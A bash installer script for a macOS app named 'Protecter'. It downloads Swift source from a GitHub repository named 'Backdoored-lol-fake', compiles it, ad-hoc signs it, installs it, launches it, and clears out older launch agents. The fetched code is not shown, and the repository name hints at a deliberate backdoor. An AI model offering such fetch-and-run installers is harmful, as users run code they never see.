#!/bin/bash
set -euo pipefail

# Protecter: build and install a real SwiftUI macOS app.
RESET=$'\033[0m'; BOLD=$'\033[1m'; CYAN=$'\033[96m'; BLUE=$'\033[94m'
GREEN=$'\033[92m'; YELLOW=$'\033[93m'; RED=$'\033[91m'; DIM=$'\033[2m'

printf "%s%s" "$CYAN" "$BOLD"
cat <<'ART'
  ____            _           _
 |  _ \ _ __ ___ | |_ ___  __| |_ ___ _ __
 | |_) | '__/ _ \| __/ _ \/ _` | __/ _ \ '__|
 |  __/| | | (_) | ||  __/ (_| | ||  __/ |
 |_|   |_|  \___/ \__\___|\__,_|\__\___|_|
ART
printf "%s            NATIVE macOS APP INSTALLER%s\n\n" "$DIM" "$RESET"

fail() { printf "%s%s✖ %s%s\n" "$RED" "$BOLD" "$1" "$RESET"; exit 1; }
step() { printf "\n%s%s➜ %s%s\n" "$BLUE" "$BOLD" "$1" "$RESET"; }
ok() { printf "  %s✔ %s%s\n" "$GREEN" "$1" "$RESET"; }

[[ "$(uname -s)" == "Darwin" ]] || fail "Protecter requires macOS."
command -v swiftc >/dev/null 2>&1 || fail "Swift compiler missing. Install Apple's Command Line Tools: xcode-select --install"

REPO="https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main"
APP="$HOME/Applications/Protecter.app"
CACHE_ROOT="$HOME/Library/Caches/Protecter"
BUILD_DIR="$(/usr/bin/mktemp -d)"
trap '/bin/rm -rf "$BUILD_DIR"' EXIT

step "Downloading Protecter source and icon"
curl -fsSL "$REPO/Protecter.swift" -o "$BUILD_DIR/Protecter.swift" || fail "Could not download Swift source."
curl -fsSL "$REPO/Protecter.icns" -o "$BUILD_DIR/Protecter.icns" || fail "Could not download the app icon."
BUILD_KEY="$(/usr/bin/shasum -a 256 "$BUILD_DIR/Protecter.swift" "$BUILD_DIR/Protecter.icns" | /usr/bin/shasum -a 256 | /usr/bin/cut -d ' ' -f 1)"
CACHED_APP="$CACHE_ROOT/$BUILD_KEY.app"
ok "Files downloaded"

if [[ -x "$CACHED_APP/Contents/MacOS/Protecter" ]]; then
  step "Using cached Protecter build"
  /bin/cp -R "$CACHED_APP" "$BUILD_DIR/Protecter.app"
  ok "Cached native app reused (compile skipped)"
else
  step "Compiling native SwiftUI executable (quick first build)"
  mkdir -p "$BUILD_DIR/Protecter.app/Contents/MacOS" "$BUILD_DIR/Protecter.app/Contents/Resources"
  swiftc -Onone -framework SwiftUI -framework AppKit \
    "$BUILD_DIR/Protecter.swift" \
    -o "$BUILD_DIR/Protecter.app/Contents/MacOS/Protecter" || fail "Swift compilation failed."
  ok "App executable compiled"

  step "Packaging Protecter.app"
  cat > "$BUILD_DIR/Protecter.app/Contents/Info.plist" <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>CFBundleExecutable</key><string>Protecter</string>
<key>CFBundleIdentifier</key><string>com.c0oled.protecter</string>
<key>CFBundleName</key><string>Protecter</string>
<key>CFBundleDisplayName</key><string>Protecter</string>
<key>CFBundlePackageType</key><string>APPL</string>
<key>CFBundleIconFile</key><string>Protecter</string>
<key>LSMinimumSystemVersion</key><string>14.0</string>
<key>NSHighResolutionCapable</key><true/>
<key>NSPrincipalClass</key><string>NSApplication</string>
</dict></plist>
PLIST
  cp "$BUILD_DIR/Protecter.icns" "$BUILD_DIR/Protecter.app/Contents/Resources/Protecter.icns"
  /usr/bin/codesign --force --deep --sign - "$BUILD_DIR/Protecter.app" >/dev/null 2>&1 || fail "Could not sign the app bundle."
  /bin/mkdir -p "$CACHE_ROOT"
  /bin/cp -R "$BUILD_DIR/Protecter.app" "$CACHED_APP"
fi
mkdir -p "$HOME/Applications"
rm -rf "$APP"
mv "$BUILD_DIR/Protecter.app" "$APP"
ok "Standalone application installed"

# Remove the previous background wrapper, if an older install left one behind.
launchctl bootout "gui/$(id -u)/com.c0oled.scanner" >/dev/null 2>&1 || true
launchctl bootout "gui/$(id -u)/com.c0oled.protecter" >/dev/null 2>&1 || true
rm -f "$HOME/Library/LaunchAgents/com.c0oled.scanner.plist" "$HOME/Library/LaunchAgents/com.c0oled.protecter.plist"
rm -rf "$HOME/Applications/c0oled Scanner.app"

printf "\n%s%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n" "$GREEN" "$BOLD" "$RESET"
printf "%s%s  ✓ PROTECTER IS INSTALLED%s\n" "$GREEN" "$BOLD" "$RESET"
printf "%s  App: %s%s\n" "$CYAN" "$APP" "$RESET"
printf "%s  Launch: open \"%s\"%s\n" "$CYAN" "$APP" "$RESET"
printf "%s  Open it and select Scan Downloads.%s\n" "$YELLOW" "$RESET"
printf "%s%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n\n" "$GREEN" "$BOLD" "$RESET"
open "$APP"
